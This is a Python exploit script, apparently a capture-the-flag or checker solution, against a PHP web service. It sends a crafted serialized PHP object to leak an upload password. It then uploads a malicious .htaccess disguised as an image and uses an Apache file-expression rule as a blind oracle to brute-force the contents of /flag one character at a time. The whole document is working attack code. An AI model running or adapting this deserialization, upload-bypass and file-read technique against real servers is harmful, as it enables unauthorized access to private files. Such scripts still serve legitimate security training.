import sys
import requests
import string

if(len(sys.argv) != 3):
	# print("usage:python exp.py ip port")
	url = "http://10.212.27.23:8693/"
else:
	url = "http://%s:%s/"%(sys.argv[1],sys.argv[2])
	
password = "ob_end_clean_is_surplus"

obj = """a:2:{i:0;O:7:"GetPass":3:{s:7:"abandon";r:2;s:6:"boring";s:4:"read";s:4:"code";s:6:"hidden";}i:1;O:7:"GetPass":3:{s:7:"abandon";r:6;s:6:"boring";s:4:"read";s:4:"code";s:4:"this";}}"""

try:
	response = requests.get(url, params={'obj':obj})
except requests.exceptions.ConnectionError:
	print("(0,Serivice unavailable)")
	exit()
if(password not in response.text):
	print("(0,Fetch password failure)")
	exit()

def check(flag):
	htaccess = '''#define width 1337
#define height 1337
<If "file('/flag')=~ /^'''+flag+'''/">
ErrorDocument 404 "or4nge"
</If>'''
	files = {'file':('.htaccess',htaccess,'image/jpeg')}
	try:
		response = requests.post(url=url, params={'pass':password}, files=files)
	except requests.exceptions.ConnectionError:
		print("(0,Serivice unavailable)")
		exit()
	if('.htaccess' not in response.text):
		print("(0,Upload .htaccess failure)")
		exit()
	upload_path = response.text[:response.text.rfind('/')]
	response = requests.get(url=url + upload_path + '/hey')
	if "or4nge" not in response.text:
		return False
	else:
		return True

flag = ''
lists = string.ascii_letters + string.digits + "{-}"
for i in range(50):
	for j in lists:
		if check(flag + j):
			flag += j
			print(flag)
			break